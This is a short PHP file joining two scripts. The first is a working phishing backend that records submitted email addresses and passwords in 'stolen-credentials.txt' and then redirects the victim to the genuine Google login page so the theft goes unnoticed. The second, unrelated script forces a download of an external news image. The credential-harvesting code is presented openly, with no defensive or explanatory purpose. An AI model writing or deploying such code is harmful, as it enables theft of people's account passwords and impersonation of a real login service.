<?php
// Check if the form was submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // Retrieve the email and password from the POST request
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Log the stolen credentials to a file
    file_put_contents('stolen-credentials.txt', "Email: $email, Password: $password\n", FILE_APPEND);

    // Redirect to the real Google login page
    header('Location: https://accounts.google.com/');
    exit;
}
?>
<?php
// Set headers to force the file download
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="downloaded_image.jpg"');

// External image URL
$imageUrl = 'https://media-cldnry.s-nbcnews.com/image/upload/t_fit-1000w,f_auto,q_auto:best/MSNBC/Components/Photo/_new/100506-ironman2-hmed.jpg';

// Read and output the image file from the external URL
readfile($imageUrl);

// Exit the script
exit();
?>

